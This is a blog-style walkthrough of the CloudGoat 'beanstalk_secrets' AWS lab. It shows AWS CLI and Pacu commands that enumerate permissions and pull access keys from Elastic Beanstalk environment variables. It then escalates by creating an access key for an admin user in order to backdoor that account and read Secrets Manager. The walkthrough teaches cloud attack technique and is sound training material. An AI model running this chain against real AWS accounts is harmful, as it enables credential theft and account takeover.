---
title: "Cloudgoat Beanstalk_Secrets Walkthrou"
date: 2025-08-21
categories: ["Cloud", "AWS"]
tags: ["AWC CLI", "Pacu", "beanstalk"]
description: "This is a wlakthrou of one of te easy environments provided by cloadgoat project"
---



# Initial Access / Credentials

```bash
initial_low_priv_credentials = Access Key: AKIA[REDACTED-CTF]
Secret Key: [REDACTED-CTF]
```

## AWC CLI profile creation

```bash
aws configure --profile low_priv
AWS Access Key ID [None]: AKIA[REDACTED-CTF]
AWS Secret Access Key [None]: [REDACTED-CTF]
Default region name [None]: us-east-1
Default output format [None]: json
```

> Created an aws profile with the credentials given

## Enumeration with  `low_priv` credentials

**whoami**
```bash
└─$ aws sts get-caller-identity --profile low_priv 
{
    "UserId": "AIDAUGVOUJQINCWVIJQHB",
    "Account": "289202785296",
    "Arn": "arn:aws:iam::289202785296:user/cgid9oc3krm0fl_low_priv_user"
}
```

> Gives us the username

## IAM Enumeration with pacu (What Privileges do our user have?)

```bash
Pacu (low_priv:imported-low_priv) > run iam__bruteforce_permissions --region us-east-1
```

> Used the **iam_bruteforce_permissions** module from pacu

**To view our the permissions that the module found we can use the whoami command

```bash
Pacu (low_priv:imported-low_priv) > whoami
{
  "UserName": "cgid9oc3krm0fl_low_priv_user",
  "RoleName": null,
  "Arn": "arn:aws:iam::289202785296:user/cgid9oc3krm0fl_low_priv_user",
  "AccountId": "289202785296",
  "UserId": "AIDAUGVOUJQINCWVIJQHB",
  "Roles": null,
  "Groups": [],
  "Policies": [],
  "AccessKeyId": "AKIA[REDACTED-CTF]",
  "SecretAccessKey": "[REDACTED-CTF]",
  "SessionToken": null,
  "KeyAlias": "imported-low_priv",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": [
      "ec2:DescribeSubnets",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken"
    ],
    "Deny": []
  }
}
```

>-Under the **Permissions** we can see what we are allowed to do.

I tried every single one of the permissions however none of it gave me data that i can work with.

```bash
aws ec2 describe-subnets --profile low_priv
aws dynamodb describe-endpoints --profile low_priv
aws sts get-session-token --profile low_priv 
```

With a bit of research regarding the word **beanstalk** which is the name of the lab I found the folloing description

> AWS Elastic Beanstalk enables customers to easily migrate, deploy, and scale full-stack applications

Knowing this we can use **aws cli** to enumrate beanstalk applications and see what we have available

## Manually enumerating Elastic Applications

```bash
aws elasticbeanstalk describe-applications --profile low_priv

{
    "Applications": [
        {
            "ApplicationArn": "arn:aws:elasticbeanstalk:us-east-1:289202785296:application/cgid9oc3krm0fl-app",
            "ApplicationName": "cgid9oc3krm0fl-app",
            "Description": "Elastic Beanstalk application for insecure secrets scenario",
            "DateCreated": "2025-08-21T06:54:26.949000+00:00",
            "DateUpdated": "2025-08-21T06:54:26.949000+00:00",
            "ConfigurationTemplates": [],
            "ResourceLifecycleConfig": {
                "VersionLifecycleConfig": {
                    "MaxCountRule": {
                        "Enabled": false,
                        "MaxCount": 200,
                        "DeleteSourceFromS3": false
                    },
                    "MaxAgeRule": {
                        "Enabled": false,
                        "MaxAgeInDays": 180,
                        "DeleteSourceFromS3": false
                    }
                }
            }
        }
    ]
}
```

> Now we have an application name

We could also gather more information about the elastic application such as its environment details

```bash
aws elasticbeanstalk describe-environments --application-name cgid9oc3krm0fl-app --profile low_priv

{
    "Environments": [
        {
            "EnvironmentName": "cgid9oc3krm0fl-env",
            "EnvironmentId": "e-xi5rv9xfmb",
            "ApplicationName": "cgid9oc3krm0fl-app",
            "SolutionStackName": "64bit Amazon Linux 2023 v4.7.1 running Python 3.11",
            "PlatformArn": "arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.7.1",
            "EndpointURL": "awseb-e-x-AWSEBLoa-DRIY4MZGVVYS-1616084218.us-east-1.elb.amazonaws.com",
            "CNAME": "cgid9oc3krm0fl-env.eba-zppuezsg.us-east-1.elasticbeanstalk.com",
            "DateCreated": "2025-08-21T06:54:43.342000+00:00",
            "DateUpdated": "2025-08-21T06:57:41.594000+00:00",
            "Status": "Ready",
            "AbortableOperationInProgress": false,
            "Health": "Grey",
            "HealthStatus": "No Data",
            "Tier": {
                "Name": "WebServer",
                "Type": "Standard",
                "Version": "1.0"
            },
            "EnvironmentLinks": [],
            "EnvironmentArn": "arn:aws:elasticbeanstalk:us-east-1:289202785296:environment/cgid9oc3krm0fl-app/cgid9oc3krm0fl-env"
        }
    ]
}

```

> We also have the applications environment name

Equiped with this information we can now pull the application's configuration including its environment variables and possibily discover critical info.

```bash
aws elasticbeanstalk describe-configuration-settings --application-name cgid9oc3krm0fl-app --environment-name cgid9oc3krm0fl-env --profile low_priv

"ConfigurationSettings": [
        {
            ---<snip>---
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "EnvironmentVariables",
                    "Value": "SECONDARY_SECRET_KEY=[REDACTED-CTF2],PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIA[REDACTED-CTF2]"
                }
            ---<snip>---
```

> Found Keys within the environment variables
> This enumeration could also be done using pacu.

## Automating the process with pacu

```bash
Pacu (low_priv_sess:imported-low_priv_sess) > run elasticbeanstalk__enum --regions us-east-1

  Running module elasticbeanstalk__enum...
[elasticbeanstalk__enum] Enumerating BeanStalk data in region us-east-1...
[elasticbeanstalk__enum]   1 application(s) found in us-east-1.
[elasticbeanstalk__enum]   1 environment(s) found in us-east-1.
        Potential secret in environment variable: SSHSourceRestriction => tcp,22,22,0.0.0.0/0
        
        Potential secret in environment variable: EnvironmentVariables => SECONDARY_SECRET_KEY=[REDACTED-CTF2],PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIA[REDACTED-CTF2]
        Potential secret in environment variable: SECONDARY_ACCESS_KEY => AKIA[REDACTED-CTF2]
``` 


> Now lets create another profile with the new credentilas that we have and start our enumeration process as we did before

# Secondary Credentials

## Creating aws profile with secondary credentials

```bash
aws configure --profile env_key      
AWS Access Key ID [None]: AKIA[REDACTED-CTF2]
AWS Secret Access Key [None]: [REDACTED-CTF2]
Default region name [None]: us-east-1
Default output format [None]: json
```

> Called the new profile env_key since we got the credentials from the environemnt variables

**whoami**

```bash
aws sts get-caller-identity --profile env_key      

{
    "UserId": "AIDAUGVOUJQIKXL6FUYGK",
    "Account": "289202785296",
    "Arn": "arn:aws:iam::289202785296:user/cgid9oc3krm0fl_secondary_user"
}
```

> Username of the new user is **cgid9oc3krm0fl_secondary_user**

**using pacu to enumerate the IAM permissions of the new user using another module called "iam__enum_permissions"**

**checking our permissions**

```bash
Pacu (env_key:imported-env_key) > whoami

{
  "UserName": "cgid9oc3krm0fl_secondary_user",
  "RoleName": null,
  "Arn": "arn:aws:iam::289202785296:user/cgid9oc3krm0fl_secondary_user",
  "AccountId": "289202785296",
  "UserId": "AIDAUGVOUJQIKXL6FUYGK",
  "Roles": null,
  "Groups": [],
  "Policies": [
    {
      "PolicyName": "cgid9oc3krm0fl_secondary_policy",
      "PolicyArn": "arn:aws:iam::289202785296:policy/cgid9oc3krm0fl_secondary_policy"
    }
  ],
  "AccessKeyId": "AKIA[REDACTED-CTF2]",
  "SecretAccessKey": "[REDACTED-CTF2]",
  "SessionToken": null,
  "KeyAlias": "imported-env_key",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": {
      "iam:createaccesskey": {
        "Resources": [
          "*"
        ]
      },
            ---<snip>---
```

> It seems that we can create access keys for any IAM user that exists!

We could also autmote this process using pacu module called **iam__privesc__scan**

```bash
Pacu (env_key:imported-env_key) > run iam__privesc_scan --scan-only
  Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   POTENTIAL: AddUserToGroup
[iam__privesc_scan]   POTENTIAL: AttachGroupPolicy
[iam__privesc_scan]   POTENTIAL: AttachRolePolicy
[iam__privesc_scan]   POTENTIAL: AttachUserPolicy
[iam__privesc_scan]   POTENTIAL: CodeStarCreateProjectFromTemplate
[iam__privesc_scan]   POTENTIAL: CodeStarCreateProjectThenAssociateTeamMember
[iam__privesc_scan]   'CONFIRMED: CreateAccessKey'
[iam__privesc_scan]   POTENTIAL: CreateEC2WithExistingIP
```

> CONFIRMED! Our user can indeed create access keys

**Lets check what users exist on the account**

```bash
aws iam list-users --profile env_key 

{
    "Users": [
        {
            "Path": "/",
            "UserName": "cgid9oc3krm0fl_admin_user",
            "UserId": "AIDAUGVOUJQIHFF3KCAV5",
            "Arn": "arn:aws:iam::289202785296:user/cgid9oc3krm0fl_admin_user",
            "CreateDate": "2025-08-21T06:54:26+00:00"
        },
        
        ---<snip>--
    ]
}
```

>-There is an admin user!

We can create keys for the admin user and backdoor that accont!

```bash
aws iam create-access-key --user-name cgid9oc3krm0fl_admin_user --profile env_key 

{
    "AccessKey": {
        "UserName": "cgid9oc3krm0fl_admin_user",
        "AccessKeyId": "AKIA[REDACTED-ADMIN]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED-ADMIN]",
        "CreateDate": "2025-08-21T11:58:24+00:00"
    }
}
```

> Perfect, let create a new admin profile with the new keys


```bash
aws configure --profile beanstalk_admin
AWS Access Key ID [None]: AKIA[REDACTED-ADMIN]
AWS Secret Access Key [None]: [REDACTED-ADMIN]
Default region name [None]: us-east-1
Default output format [None]: json
```

Lets get the flag by dumping the **secrets manager**

```bash
aws secretsmanager list-secrets --profile beanstalk_admin

{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:289202785296:secret:cgid9oc3krm0fl_final_flag-V5tMVD",
            "Name": "cgid9oc3krm0fl_final_flag",
            "LastChangedDate": "2025-08-21T01:54:27.561000-05:00",
            "LastAccessedDate": "2025-08-20T19:00:00-05:00",
            "Tags": [
                {
        ---<snip>---
```
